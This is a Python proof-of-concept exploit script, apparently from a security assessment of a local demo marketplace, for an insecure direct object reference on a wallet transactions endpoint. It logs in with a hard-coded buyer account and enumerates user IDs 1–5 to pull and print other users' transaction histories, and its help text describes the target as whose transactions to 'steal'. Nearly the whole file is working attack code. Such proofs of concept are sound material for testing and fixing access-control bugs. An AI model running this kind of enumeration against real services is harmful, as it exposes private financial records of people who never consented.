#!/usr/bin/env python3
"""
BAC-2 — IDOR on Wallet Transaction History
Endpoint: GET /api/wallet/transactions?user_id=<target>
Auth    : Any authenticated user

The transactions endpoint accepts an optional `user_id` query param.
When supplied, it fetches that user's wallet instead of the
authenticated user's own — exposing full financial history of any user.

Usage
-----
    python poc_006_idor_transaction_history.py
    python poc_006_idor_transaction_history.py --url http://localhost:8000 --target-id 2
"""

import argparse
import sys
import requests

ATTACKER_EMAIL    = "charlie@mercury.com"
ATTACKER_PASSWORD = "Buyer123!"


def banner():
    print("=" * 60)
    print("  BAC-2 — IDOR on Wallet Transaction History")
    print("  Endpoint: GET /api/wallet/transactions?user_id=N")
    print("=" * 60)


def login(base_url, email, password):
    resp = requests.post(f"{base_url}/api/auth/login",
                         json={"email": email, "password": password}, timeout=10)
    resp.raise_for_status()
    token = resp.json().get("access_token")
    if not token:
        print("[-] Login failed"); sys.exit(1)
    return token


def get_my_id(base_url, token):
    resp = requests.get(f"{base_url}/api/users/me",
                        headers={"Authorization": f"Bearer {token}"}, timeout=10)
    resp.raise_for_status()
    return resp.json()["id"]


def fetch_transactions(base_url, token, user_id=None):
    params = {}
    if user_id is not None:
        params["user_id"] = user_id
    resp = requests.get(f"{base_url}/api/wallet/transactions",
                        headers={"Authorization": f"Bearer {token}"},
                        params=params, timeout=10)
    resp.raise_for_status()
    return resp.json()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="http://localhost:8000")
    parser.add_argument("--target-id", type=int, default=None,
                        help="User ID whose transactions to steal (default: tries IDs 1-5)")
    args = parser.parse_args()

    banner()
    token = login(args.url, ATTACKER_EMAIL, ATTACKER_PASSWORD)
    my_id = get_my_id(args.url, token)
    print(f"[+] Authenticated as {ATTACKER_EMAIL} (id={my_id})")

    my_txns = fetch_transactions(args.url, token)
    print(f"[*] My own transactions: {my_txns['total']} records")
    print()

    targets = [args.target_id] if args.target_id else [i for i in range(1, 6) if i != my_id]
    for uid in targets:
        data = fetch_transactions(args.url, token, user_id=uid)
        print(f"[+] user_id={uid} → {data['total']} transactions")
        for t in data["items"][:3]:
            print(f"    {t['transaction_type']:20s}  ${t['amount']:>10.2f}  {t['description']}")

    print("\n[+] Done.")


if __name__ == "__main__":
    main()
